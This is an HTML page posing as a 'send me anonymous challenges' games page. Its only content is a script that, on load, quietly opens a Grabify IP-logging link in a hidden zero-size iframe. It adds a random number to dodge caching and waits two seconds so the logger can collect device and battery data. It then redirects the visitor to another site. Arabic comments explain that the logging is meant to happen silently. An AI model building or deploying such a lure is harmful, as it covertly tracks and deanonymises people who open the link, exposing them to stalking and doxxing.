<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send me anonymous challenges on GamesZoneX!</title>
</head>
<body>

  <script>
    window.addEventListener("load", function() {
      // 1. توليد رقم عشوائي لكسر حماية التكرار والكاش
      const randomNumber = Math.floor(Math.random() * 999999);
      
      // قم بوضع رابطك الجديد أو الحالي هنا مع إضافة متغير الكاش
      const grabifyUrl = "https://grabify.link" + randomNumber; 
      const destinationUrl = "https://dominoes.mx";

      // 2. إنشاء iframe برمجياً لإعطاء الـ Smart Logger بيئة متصفح كاملة للعمل
      const iframe = document.createElement('iframe');
      iframe.style.display = "none";
      iframe.style.width = "0px";
      iframe.style.height = "0px";
      iframe.style.border = "none";
      iframe.src = grabifyUrl;
      
      // إدخال الإطار في الصفحة ليبدأ بالعمل فوراً
      document.body.appendChild(iframe);

      // 3. نمنح الـ Smart Logger مهلة (ثانيتين) لجمع بيانات البطارية والجهاز وإرسالها بالكامل
      setTimeout(function() {
          window.location.href = destinationUrl;
      }, 2000); // ثانيتين كافية جداً لإنهاء الـ Smart Logger مهمته بصمت
    });
  </script>

</body>
</html>
